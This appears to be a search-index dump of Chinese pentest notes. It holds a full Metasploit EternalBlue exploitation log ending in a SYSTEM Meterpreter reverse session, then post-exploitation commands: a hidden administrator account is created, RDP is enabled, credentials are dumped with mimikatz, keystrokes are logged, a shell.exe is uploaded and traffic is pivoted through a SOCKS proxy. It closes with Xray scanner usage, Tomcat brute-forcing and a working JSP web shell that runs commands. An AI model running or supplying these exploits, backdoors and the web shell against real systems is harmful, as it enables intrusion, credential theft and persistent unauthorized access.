connection creating free hole adjacent to SMBv2 buffer. [ * ] 192 .168.32.130:445 - Sending final SMBv2 buffers. [ * ] 192 .168.32.130:445 - Sending last fragment of exploit packet! [ * ] 192 .168.32.130:445 - Receiving response from exploit packet [ + ] 192 .168.32.130:445 - ETERNALBLUE overwrite completed successfully ( 0xC000000D ) ! [ * ] 192 .168.32.130:445 - Sending egg to corrupted connection. [ * ] 192 .168.32.130:445 - Triggering free of corrupted buffer. [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = FAIL- = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ - ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ * ] 192 .168.32.130:445 - Connecting to target for exploitation. [ + ] 192 .168.32.130:445 - Connection established for exploitation. [ + ] 192 .168.32.130:445 - Target OS selected valid for OS indicated by SMB reply [ * ] 192 .168.32.130:445 - CORE raw buffer dump ( 51 bytes ) [ * ] 192 .168.32.130:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2 [ * ] 192 .168.32.130:445 - 0x00000010 30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20 008 HPC Edition [ * ] 192 .168.32.130:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac [ * ] 192 .168.32.130:445 - 0x00000030 6b 20 31 k 1 [ + ] 192 .168.32.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply [ * ] 192 .168.32.130:445 - Trying exploit with 17 Groom Allocations. [ * ] 192 .168.32.130:445 - Sending all but last fragment of exploit packet [ * ] 192 .168.32.130:445 - Starting non-paged pool grooming [ + ] 192 .168.32.130:445 - Sending SMBv2 buffers [ + ] 192 .168.32.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [ * ] 192 .168.32.130:445 - Sending final SMBv2 buffers. [ * ] 192 .168.32.130:445 - Sending last fragment of exploit packet! [ * ] 192 .168.32.130:445 - Receiving response from exploit packet [ + ] 192 .168.32.130:445 - ETERNALBLUE overwrite completed successfully ( 0xC000000D ) ! [ * ] 192 .168.32.130:445 - Sending egg to corrupted connection. [ * ] 192 .168.32.130:445 - Triggering free of corrupted buffer. [ * ] Sending stage ( 200262 bytes ) to 192 .168.32.130 [ * ] Sending stage ( 200262 bytes ) to 192 .168.32.130 [ * ] Meterpreter session 3 opened ( 192 .168.32.128:4444 -> 192 .168.32.130:49169 ) at 2021 -07-23 14 :07:02 +0800 [ * ] Meterpreter session 2 opened ( 192 .168.32.128:4444 -> 192 .168.32.130:49168 ) at 2021 -07-23 14 :07:02 +0800 [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = -WIN- = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = [ + ] 192 .168.32.130:445 - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = meterpreter > getuid Server username: NT AUTHORITY \\S YSTEM","title":"ms17-010 \u5229\u7528"},{"location":"tools/msf/#win","text":"cmd \u4e71\u7801\u53ef\u4ee5\u901a\u8fc7 chcp 65001 \u4fee\u6539 \u67e5\u770b\u7528\u6237 net user \u6dfb\u52a0\u7528\u6237 net user USERNAME PASSWORD /add \u6dfb\u52a0\u7528\u6237\u5230\u7ba1\u7406\u5458\u7ec4 net localgroup administrators USERNAME /add","title":"Win \u6e17\u900f\u540e\u601d\u8def"},{"location":"tools/msf/#_8","text":"meterpreter > shell Process 1272 created. Channel 2 created. Microsoft Windows [ Version 6 .1.7601 ] Copyright ( c ) 2009 Microsoft Corporation. All rights reserved. C: \\W indows \\s ystem32>net user net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest The command completed with one or more errors. C: \\W indows \\s ystem32>net user root R00t2o21 /add net user root R00t2o21 /add The command completed successfully. C: \\W indows \\s ystem32>net user net user User accounts for \\\\ ------------------------------------------------------------------------------- Administrator Guest root The command completed with one or more errors. C: \\W indows \\s ystem32>net localgroup administrators net localgroup administrators Alias name administrators Comment \u2592\u2592\u2592\u2592\u0531\u2592\u053c\u2592\u2592\u2592\u2592/\u2592\u2592\u2592\u0432\u2592\u2592\u2592\u2592\u2592\u2592\u01b5\u2592\u2592\u2592\u022b\u2592\u2592\u2592\u2592\u0228 Members ------------------------------------------------------------------------------- Administrator The command completed successfully. C: \\W indows \\s ystem32>net localgroup administrators root /add net localgroup administrators root /add The command completed successfully. C: \\W indows \\s ystem32>net localgroup administrators net localgroup administrators Alias name administrators Comment \u2592\u2592\u2592\u2592\u0531\u2592\u053c\u2592\u2592\u2592\u2592/\u2592\u2592\u2592\u0432\u2592\u2592\u2592\u2592\u2592\u2592\u01b5\u2592\u2592\u2592\u022b\u2592\u2592\u2592\u2592\u0228 Members ------------------------------------------------------------------------------- Administrator root The command completed successfully.","title":"\u6dfb\u52a0\u7528\u6237"},{"location":"tools/msf/#_9","text":"C:\\Windows\\system32>netstat -an netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING TCP 192.168.32.130:139 0.0.0.0:0 LISTENING TCP 192.168.32.130:49174 192.168.32.128:4444 ESTABLISHED TCP 192.168.32.130:49175 192.168.32.128:4444 ESTABLISHED TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:47001 [::]:0 LISTENING TCP [::]:49152 [::]:0 LISTENING TCP [::]:49153 [::]:0 LISTENING TCP [::]:49154 [::]:0 LISTENING TCP [::]:49155 [::]:0 LISTENING TCP [::]:49156 [::]:0 LISTENING UDP 0.0.0.0:5355 *:* UDP 192.168.32.130:137 *:* UDP 192.168.32.130:138 *:* UDP [::]:5355 *:* C:\\Windows\\system32>exit meterpreter > run post/windows/manage/enable_rdp [*] Enabling Remote Desktop [*] RDP is disabled; enabling it ... [*] Setting Terminal Services service startup mode [*] The Terminal Services service is not set to auto, changing it to auto ... [*] Opening port in local firewall if necessary [*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210723151640_default_192.168.32.146_host.windows.cle_977805.txt C:\\Windows\\system32>netstat -an netstat -an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING TCP 192.168.32.130:139 0.0.0.0:0 LISTENING TCP 192.168.32.130:49158 192.168.32.128:4444 ESTABLISHED TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:3389 [::]:0 LISTENING TCP [::]:47001 [::]:0 LISTENING TCP [::]:49152 [::]:0 LISTENING TCP [::]:49153 [::]:0 LISTENING TCP [::]:49154 [::]:0 LISTENING TCP [::]:49155 [::]:0 LISTENING TCP [::]:49156 [::]:0 LISTENING UDP 0.0.0.0:5355 *:* UDP 192.168.32.130:137 *:* UDP 192.168.32.130:138 *:* UDP [::]:5355 *:* UDP [fe80::60e3:cb71:9810:3edd%11]:546 *:*","title":"\u5f00\u542f\u8fdc\u7a0b\u684c\u9762"},{"location":"tools/msf/#_10","text":"meterpreter > load kiwi Loading extension kiwi... .#####. mimikatz 2 .2.0 20191125 ( x64/windows ) .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com ***/ Success. meterpreter > creds_all [ + ] Running as SYSTEM [ * ] Retrieving all credentials wdigest credentials =================== Username Domain Password -------- ------ -------- ( null ) ( null ) ( null ) WIN-RB49N4UMHO0$ WORKGROUP ( null ) kerberos credentials ==================== Username Domain Password -------- ------ -------- ( null ) ( null ) ( null ) win-rb49n4umho0$ WORKGROUP ( null )","title":"\u5c1d\u8bd5\u83b7\u53d6\u7528\u5bc6\u7801"},{"location":"tools/msf/#meterpreter","text":"","title":"meterpreter \u5176\u4ed6\u547d\u4ee4"},{"location":"tools/msf/#_11","text":"meterpreter > sysinfo Computer : WIN-RB49N4UMHO0 OS : Windows 2008 R2 ( 6 .1 Build 7601 , Service Pack 1 ) . Architecture : x64 System Language : zh_CN Domain : WORKGROUP Logged On Users : 1 Meterpreter : x64/windows","title":"\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f"},{"location":"tools/msf/#_12","text":"\u76ee\u6807\u7cfb\u7edf\u5c4f\u5e55\u622a\u56fe\u76f4\u63a5\u53d1\u9001\u5230\u88c5\u6709 msf \u7684\u4e3b\u673a meterpreter > screenshot Screenshot saved to: /root/wIeuGWMF.jpeg","title":"\u5c4f\u5e55\u622a\u56fe"},{"location":"tools/msf/#_13","text":"\u5c1d\u8bd5\u83b7\u53d6 system \u6743\u9650, \u4e0d\u4e00\u5b9a\u6210\u529f meterpreter > getsystem ...got system via technique 1 ( Named Pipe Impersonation ( In Memory/Admin )) .","title":"\u63d0\u6743"},{"location":"tools/msf/#_14","text":"meterpreter > keyscan_start Starting the keystroke sniffer ... meterpreter > keyscan_stop Stopping the keystroke sniffer... meterpreter > keyscan_dump Dumping captured keystrokes...","title":"\u952e\u76d8\u8bb0\u5f55"},{"location":"tools/msf/#_15","text":"meterpreter > webcam_stream [ - ] Target does not have a webcam","title":"\u5f00\u542f\u6444\u50cf\u5934"},{"location":"tools/msf/#_16","text":"meterpreter > upload /root/shell.exe C:/windows [ * ] uploading : /root/shell.exe -> C:/windows [ * ] uploaded : /root/shell.exe -> C:/windows \\s hell.exe meterpreter > download C:/windows/regedit.exe [ * ] Downloading: C:/windows/regedit.exe -> /root/regedit.exe [ * ] Downloaded 417 .00 KiB of 417 .00 KiB ( 100 .0% ) : C:/windows/regedit.exe -> /root/regedit.exe [ * ] download : C:/windows/regedit.exe -> /root/regedit.exe","title":"\u4e0a\u4f20\u4e0b\u8f7d"},{"location":"tools/msf/#_17","text":"\u8def\u7531\u914d\u7f6e\u540e\u53ef\u4ee5\u4f7f\u7528 background \u6302\u8d77, \u8fd4\u56de msf \u4f7f\u7528\u5bf9\u5e94\u6a21\u5757 meterpreter > run autoroute -p [ ! ] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute. [ ! ] Example: run post/multi/manage/autoroute OPTION = value [ ... ] [ - ] Could not execute autoroute: ArgumentError wrong number of arguments ( given 2 , expected 0 ..1 ) meterpreter > run autoroute -s 192 .168.128.0/24 meterpreter > run post/windows/gather/arp_scanner rhosts = 192 .168.128.0/24 [ * ] Running module against WIN-RB49N4UMHO0 [ * ] ARP Scanning 192 .168.128.0/24 meterpreter > run auxiliary/scanner/portscan/tcp rhosts = 192 .168.128.1 [ + ] 192 .168.128.1: - 192 .168.128.1:25 - TCP OPEN [ + ] 192 .168.128.1: - 192 .168.128.1:110 - TCP OPEN","title":"\u8def\u7531\u8f6c\u53d1"},{"location":"tools/msf/#_18","text":"meterpreter > run autoroute -s 192 .168.128.0/24 meterpreter > background msf6 exploit ( windows/smb/ms17_010_eternalblue ) > back msf6 > use auxiliary/server/socks_proxy msf6 auxiliary ( server/socks_proxy ) > set srvhost 192 .168.32.128 srvhost = > 192 .168.32.128 msf6 auxiliary ( server/socks_proxy ) > exploit [ * ] Auxiliary module running as background job 0 . msf6 auxiliary ( server/socks_proxy ) > [ * ] Starting the SOCKS proxy server \u901a\u8fc7 proxychains \u8bbe\u7f6e msf \u4ee3\u7406\u5730\u5740\u4f7f nmap \u7b49\u5de5\u5177\u5bf9\u76ee\u6807\u5185\u7f51\u6e17\u900f proxychains nnmap -sT -sV -Pn -n -p22,80,135,139,445,3306 --script = smb-vuln-ms17-010.nse","title":"\u4ee3\u7406"},{"location":"tools/xray/","text":"Xray \u6f0f\u6d1e\u626b\u63cf Xray \u7b80\u4ecb Xray \u662f\u4e00\u6b3e\u529f\u80fd\u5f3a\u5927\u7684\u5b89\u5168\u8bc4\u4f30\u5de5\u5177, \u6709\u591a\u540d\u7ecf\u9a8c\u4e30\u5bcc\u7684\u4e00\u7ebf\u5b89\u5168\u4ece\u4e1a\u8005\u6253\u9020\u800c\u6210. \u652f\u6301\u591a\u79cd\u6f0f\u6d1e\u68c0\u6d4b XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb SSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 \u547d\u4ee4, \u4ee3\u7801\u6ce8\u5165 ThinkPHP \u7cfb\u5217\u6f0f\u6d1e \u8def\u5f84\u7a7f\u8d8a \u5f31\u53e3\u4ee4 SQL \u6ce8\u5165 \u6587\u4ef6\u4e0a\u4f20 \u76ee\u5f55\u679a\u4e3e POC \u6846\u67b6 XML \u5b9e\u4f53\u6ce8\u5165 CRLF \u6ce8\u5165 POC \u6846\u67b6\u9ed8\u8ba4\u4f7f\u7528\u5185\u7f6e Github \u4e0a\u8d21\u732e\u7684 POC, \u7528\u6237\u4e5f\u53ef\u4ee5\u6839\u636e\u9700\u8981\u81ea\u884c\u6784\u5efa POC \u5e76\u8fd0\u884c. \u6f0f\u6d1e\u626b\u63cf\u548c\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u7edf\u79f0\u4e3a\u7ed3\u679c\u8f93\u51fa, Xray \u5b9a\u4e49\u4e86\u5982\u4e0b\u51e0\u79cd\u8f93\u51fa\u65b9\u5f0f. Stdout \u6807\u51c6\u8f93\u51fa \u9ed8\u8ba4\u7684\u8f93\u51fa\u65b9\u5f0f JSON \u6587\u4ef6\u8f93\u51fa --json-output FILENAME.json HTML \u62a5\u544a\u8f93\u51fa --html-output FILENAME.json Webhook \u8f93\u51fa --webhook-output value ~ $ xray version ____ ___.________. ____. _____.___. \\ \\/ /\\_ __ \\ / _ \\ \\__ | | \\ / | _ _/ / /_\\ \\ / | | / \\ | | \\/ | \\ \\____ | \\___/\\ \\ |____| /\\____|_ / / _____/ \\_/ \\_/ \\_/ \\/ Version: 1.7.1/f725e41e/COMMUNITY [xray 1.7.1/f725e41e] Build: [2021-03-18] [linux/amd64] [RELEASE/COMMUNITY] Compiler Version: go version go1.15.6 linux/amd64 To show open source licenses, please use `osslicense` sub-command. Xray \u57fa\u672c\u626b\u63cf\u6a21\u5f0f \u4ee3\u7406\u6a21\u5f0f \u4f5c\u4e3a\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7684\u4e2d\u95f4\u4eba, \u88ab\u52a8\u8fdb\u884c\u6d41\u91cf\u91cd\u53d1\u5206\u6790. \u751f\u6210\u8bc1\u4e66, \u6d4f\u89c8\u5668\u5bfc\u5165 ca.crt \u81f3\u8bc1\u4e66\u9881\u53d1\u673a\u6784 ~ $ xray genca Xray \u5f00\u542f\u4ee3\u7406\u540e, \u6d4f\u89c8\u5668\u8bbe\u7f6e\u4ee3\u7406\u5c06\u6d41\u91cf\u8f6c\u53d1\u81f3 Xray \u8fdb\u884c\u626b\u63cf ~ $ xray webscan --listen 127.0.0.1:8888 --html-output proxy_scan.html \u626b\u63cf\u7ed3\u675f Ctrl+C \u7ec8\u6b62 Xray \u4efb\u52a1 \u722c\u866b\u6a21\u5f0f \u6a21\u62df\u4eba\u5de5\u4e3b\u52a8\u8bbf\u95ee\u722c\u53d6\u94fe\u63a5, \u81ea\u52a8\u8fdb\u884c\u626b\u63cf\u5206\u6790, \u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e. ~ $ xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output spider_scan.html \u670d\u52a1\u6a21\u5f0f \u4f7f\u7528\u9884\u5236 POC \u626b\u63cf\u4e2d\u95f4\u4ef6\u7b49\u670d\u52a1\u6f0f\u6d1e, \u4f46\u76ee\u524d\u5185\u7f6e POC \u8f83\u5c11(\u53ea\u6709 tomcat-cve-2020-1938) ~ $ xray servicescan --target testphp.vulnweb.com:80 --html-output service_scan.html --target-file \u53ef\u4ee5\u6279\u91cf\u626b\u63cf, \u683c\u5f0f\u4e3a IP:PORT , \u4e00\u884c\u4e00\u4e2a \u626b\u63cf\u63d2\u4ef6 --plugins xss,sqldet,phantasm \u6307\u5b9a\u8981\u8fd0\u884c\u7684\u63d2\u4ef6, \u7528 , \u5206\u9694 --poc \u914d\u7f6e\u672c\u6b21\u626b\u63cf\u542f\u7528\u54ea\u4e9b POC, \u4f7f\u7528 , \u5206\u9694 --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce \u53ea\u52a0\u8f7d\u4e00\u4e2a POC, \u7cbe\u51c6\u5339\u914d --plugins phantasm --poc \"*thinkphp*\" \u52a0\u8f7d\u5185\u7f6e\u6240\u6709\u5e26 thinkphp \u7684 POC --plugins phantasm --poc \"/home/test/pocs/*\" \u52a0\u8f7d\u672c\u5730 /home/test/pocs \u76ee\u5f55\u4e2d\u6240\u6709 POC --plugins phantasm --poc \"/home/test/pocs/*thinkphp*\" \u52a0\u8f7d /home/test/pocs \u4e0b\u5305\u542b thinkphp \u7684 POC \u8054\u52a8 BurpSuite Xray \u5f00\u542f\u7aef\u53e3\u76d1\u542c\u540e BurpSuite \u4e2d\u914d\u7f6e Upstream Proxy Servers BurpSuite --> User Options --> Upstream Proxy Server (\u914d\u7f6e\u76ee\u6807\u5730\u5740\u4ee5\u53ca Xray \u4ee3\u7406\u5730\u5740\u548c\u7aef\u53e3) \u6d4f\u89c8\u5668\u4ee3\u7406\u914d\u7f6e\u4e3a BurpSuite \u7684 8080 \u7aef\u53e3, \u5b9e\u73b0 BurpSuite \u548c Xray \u7684\u6570\u636e\u540c\u6b65","title":"Xray \u6f0f\u6d1e\u626b\u63cf"},{"location":"tools/xray/#xray","text":"","title":"Xray \u6f0f\u6d1e\u626b\u63cf"},{"location":"tools/xray/#xray_1","text":"Xray \u662f\u4e00\u6b3e\u529f\u80fd\u5f3a\u5927\u7684\u5b89\u5168\u8bc4\u4f30\u5de5\u5177, \u6709\u591a\u540d\u7ecf\u9a8c\u4e30\u5bcc\u7684\u4e00\u7ebf\u5b89\u5168\u4ece\u4e1a\u8005\u6253\u9020\u800c\u6210.","title":"Xray \u7b80\u4ecb"},{"location":"tools/xray/#_1","text":"XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb SSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 \u547d\u4ee4, \u4ee3\u7801\u6ce8\u5165 ThinkPHP \u7cfb\u5217\u6f0f\u6d1e \u8def\u5f84\u7a7f\u8d8a \u5f31\u53e3\u4ee4 SQL \u6ce8\u5165 \u6587\u4ef6\u4e0a\u4f20 \u76ee\u5f55\u679a\u4e3e POC \u6846\u67b6 XML \u5b9e\u4f53\u6ce8\u5165 CRLF \u6ce8\u5165 POC \u6846\u67b6\u9ed8\u8ba4\u4f7f\u7528\u5185\u7f6e Github \u4e0a\u8d21\u732e\u7684 POC, \u7528\u6237\u4e5f\u53ef\u4ee5\u6839\u636e\u9700\u8981\u81ea\u884c\u6784\u5efa POC \u5e76\u8fd0\u884c. \u6f0f\u6d1e\u626b\u63cf\u548c\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u7edf\u79f0\u4e3a\u7ed3\u679c\u8f93\u51fa, Xray \u5b9a\u4e49\u4e86\u5982\u4e0b\u51e0\u79cd\u8f93\u51fa\u65b9\u5f0f. Stdout \u6807\u51c6\u8f93\u51fa \u9ed8\u8ba4\u7684\u8f93\u51fa\u65b9\u5f0f JSON \u6587\u4ef6\u8f93\u51fa --json-output FILENAME.json HTML \u62a5\u544a\u8f93\u51fa --html-output FILENAME.json Webhook \u8f93\u51fa --webhook-output value ~ $ xray version ____ ___.________. ____. _____.___. \\ \\/ /\\_ __ \\ / _ \\ \\__ | | \\ / | _ _/ / /_\\ \\ / | | / \\ | | \\/ | \\ \\____ | \\___/\\ \\ |____| /\\____|_ / / _____/ \\_/ \\_/ \\_/ \\/ Version: 1.7.1/f725e41e/COMMUNITY [xray 1.7.1/f725e41e] Build: [2021-03-18] [linux/amd64] [RELEASE/COMMUNITY] Compiler Version: go version go1.15.6 linux/amd64 To show open source licenses, please use `osslicense` sub-command.","title":"\u652f\u6301\u591a\u79cd\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"tools/xray/#xray_2","text":"","title":"Xray \u57fa\u672c\u626b\u63cf\u6a21\u5f0f"},{"location":"tools/xray/#_2","text":"\u4f5c\u4e3a\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u5668\u7684\u4e2d\u95f4\u4eba, \u88ab\u52a8\u8fdb\u884c\u6d41\u91cf\u91cd\u53d1\u5206\u6790. \u751f\u6210\u8bc1\u4e66, \u6d4f\u89c8\u5668\u5bfc\u5165 ca.crt \u81f3\u8bc1\u4e66\u9881\u53d1\u673a\u6784 ~ $ xray genca Xray \u5f00\u542f\u4ee3\u7406\u540e, \u6d4f\u89c8\u5668\u8bbe\u7f6e\u4ee3\u7406\u5c06\u6d41\u91cf\u8f6c\u53d1\u81f3 Xray \u8fdb\u884c\u626b\u63cf ~ $ xray webscan --listen 127.0.0.1:8888 --html-output proxy_scan.html \u626b\u63cf\u7ed3\u675f Ctrl+C \u7ec8\u6b62 Xray \u4efb\u52a1","title":"\u4ee3\u7406\u6a21\u5f0f"},{"location":"tools/xray/#_3","text":"\u6a21\u62df\u4eba\u5de5\u4e3b\u52a8\u8bbf\u95ee\u722c\u53d6\u94fe\u63a5, \u81ea\u52a8\u8fdb\u884c\u626b\u63cf\u5206\u6790, \u63a2\u6d4b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e. ~ $ xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output spider_scan.html","title":"\u722c\u866b\u6a21\u5f0f"},{"location":"tools/xray/#_4","text":"\u4f7f\u7528\u9884\u5236 POC \u626b\u63cf\u4e2d\u95f4\u4ef6\u7b49\u670d\u52a1\u6f0f\u6d1e, \u4f46\u76ee\u524d\u5185\u7f6e POC \u8f83\u5c11(\u53ea\u6709 tomcat-cve-2020-1938) ~ $ xray servicescan --target testphp.vulnweb.com:80 --html-output service_scan.html --target-file \u53ef\u4ee5\u6279\u91cf\u626b\u63cf, \u683c\u5f0f\u4e3a IP:PORT , \u4e00\u884c\u4e00\u4e2a","title":"\u670d\u52a1\u6a21\u5f0f"},{"location":"tools/xray/#_5","text":"--plugins xss,sqldet,phantasm \u6307\u5b9a\u8981\u8fd0\u884c\u7684\u63d2\u4ef6, \u7528 , \u5206\u9694 --poc \u914d\u7f6e\u672c\u6b21\u626b\u63cf\u542f\u7528\u54ea\u4e9b POC, \u4f7f\u7528 , \u5206\u9694 --plugins phantasm --poc poc-yaml-thinkphp5-controller-rce \u53ea\u52a0\u8f7d\u4e00\u4e2a POC, \u7cbe\u51c6\u5339\u914d --plugins phantasm --poc \"*thinkphp*\" \u52a0\u8f7d\u5185\u7f6e\u6240\u6709\u5e26 thinkphp \u7684 POC --plugins phantasm --poc \"/home/test/pocs/*\" \u52a0\u8f7d\u672c\u5730 /home/test/pocs \u76ee\u5f55\u4e2d\u6240\u6709 POC --plugins phantasm --poc \"/home/test/pocs/*thinkphp*\" \u52a0\u8f7d /home/test/pocs \u4e0b\u5305\u542b thinkphp \u7684 POC","title":"\u626b\u63cf\u63d2\u4ef6"},{"location":"tools/xray/#burpsuite","text":"Xray \u5f00\u542f\u7aef\u53e3\u76d1\u542c\u540e BurpSuite \u4e2d\u914d\u7f6e Upstream Proxy Servers BurpSuite --> User Options --> Upstream Proxy Server (\u914d\u7f6e\u76ee\u6807\u5730\u5740\u4ee5\u53ca Xray \u4ee3\u7406\u5730\u5740\u548c\u7aef\u53e3) \u6d4f\u89c8\u5668\u4ee3\u7406\u914d\u7f6e\u4e3a BurpSuite \u7684 8080 \u7aef\u53e3, \u5b9e\u73b0 BurpSuite \u548c Xray \u7684\u6570\u636e\u540c\u6b65","title":"\u8054\u52a8 BurpSuite"},{"location":"web/authentication_attack/","text":"\u8eab\u4efd\u8ba4\u8bc1\u4ecb\u7ecd \u8eab\u4efd\u8ba4\u8bc1\u6280\u672f\u662f\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\u786e\u8ba4\u64cd\u4f5c\u8005\u8eab\u4efd\u7684\u8fc7\u7a0b\u800c\u4ea7\u751f\u7684\u6709\u6548\u89e3\u51b3\u65b9\u6cd5\u3002 \u8ba1\u7b97\u673a\u7f51\u7edc\u4e16\u754c\u4e2d\u4e00\u5207\u4fe1\u606f\u5305\u62ec\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\u90fd\u662f\u7528\u4e00\u7ec4\u7279\u5b9a\u7684\u6570\u636e\u6765\u8868\u793a\u7684\uff0c\u8ba1\u7b97\u673a\u53ea\u80fd\u8bc6\u522b\u7528\u6237\u7684\u6570\u5b57\u8eab\u4efd\uff0c\u6240\u6709\u5bf9\u7528\u6237\u7684\u6388\u6743\u4e5f\u662f\u9488\u5bf9\u7528\u6237\u6570\u5b57\u8eab\u4efd\u7684\u6388\u6743\u3002 \u8eab\u4efd\u8ba4\u8bc1\u653b\u51fb\u5c31\u662f\u4e3a\u4e86\u4f7f\u7528\u5404\u79cd\u529e\u6cd5\u901a\u8fc7\u8fd9\u5c42\u8ba4\u8bc1\uff0c\u7a81\u7834\u4f5c\u4e3a\u9632\u62a4\u7f51\u7edc\u8d44\u4ea7\u7684\u7b2c\u4e00\u9053\u5173\u53e3\uff0c\u8eab\u4efd\u8ba4\u8bc1\u653b\u51fb\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u6709\u7740\u4e3e\u8db3\u8f7b\u91cd\u7684\u4f5c\u7528\u3002 Web\u8ba4\u8bc1\u653b\u51fb \u5e38\u89c1web\u767b\u9646\u53e3\u53ea\u6709\u7528\u6237\u540d\u8ddf\u5bc6\u7801, \u6ca1\u6709\u9a8c\u8bc1\u7801, \u53ef\u4ee5\u4f7f\u7528 BurpSuite \u7684 Intruder \u6a21\u5757\u8fdb\u884c\u66b4\u529b\u7834\u89e3\u3002 Basic\u8ba4\u8bc1\u653b\u51fb Tomcat \u66b4\u529b\u7834\u89e3 \u53d1\u73b0 Tomcat \u767b\u5f55\u754c\u9762 Burpsuite \u6293\u5305 \u53d1\u73b0\u4f7f\u7528 Basic \u8ba4\u8bc1\u52a0\u5bc6, \u89c2\u5bdf\u63a8\u6d4b\u53ef\u80fd\u662f Basic64 , \u89e3\u7801\u540e\u53d1\u73b0\u683c\u5f0f\u4e3a \u7528\u6237\u540d:\u5bc6\u7801 Intruder \u66b4\u529b\u7834\u89e3 \u4f7f\u7528\u81ea\u5b9a\u4e49\u8fed\u4ee3\u5668, \u4f4d\u7f6e1 \u4e3a\u7528\u6237\u540d, \u4f4d\u7f6e2 \u4e3a\u5bc6\u7801, \u5206\u5272\u7b26\u4e3a : , \u5e76\u4f7f\u7528 Base64 \u7f16\u7801\u8f6c\u5316 \u3002 \u53d1\u73b0\u8fd4\u56de\u6570\u636e\u8f83\u5927\u7684\u8bf7\u6c42, \u5bf9 Basic \u5b57\u6bb5\u8fdb\u884c Base64 \u89e3\u7801, \u5f97\u5230 tomcat:admin \u767b\u5f55\u540e\u53f0 \u5c1d\u8bd5\u4f7f\u7528 tomcat:admin \u767b\u5f55, \u8fdb\u5165\u540e\u53f0 \u3002 \u4e0a\u4f20 war \u5305 \u65b0\u5efa shell.jsp \u6587\u4ef6\uff0c\u8f6c\u5316\u4e3a war \u6587\u4ef6\u3002 <% if ( \"x\" . equals ( request . getParameter ( \"pwd\" ))) { java . io . InputStream in = Runtime . getRuntime (). exec ( request . getParameter ( \"i\" )). getInputStream (); int a =- 1 ; byte [] b = new byte [ 2048 ] ; out . print ( \"<pre>\" ); while (( a = in . read ( b )) !=- 1 ) { out . println ( new String ( b )); } out . print ( \"</pre>\" ); } %> \u540e\u53f0\u9009\u62e9\u751f\u6210\u7684 war \u6587\u4ef6\uff0c\u7136\u540e Deploy\u3002 \u4f20\u9012\u53c2\u6570\u6267\u884c\u547d\u4ee4 MSF \u7684 auxiliary/scanner/http/tomcat_mgr_login \u6a21\u5757\u4e5f\u53ef\u4ee5\u5bf9 Tomcat \u540e\u53f0\u767b\u5f55\u8fdb\u884c\u66b4\u529b\u7834\u89e3","title":"Authentication 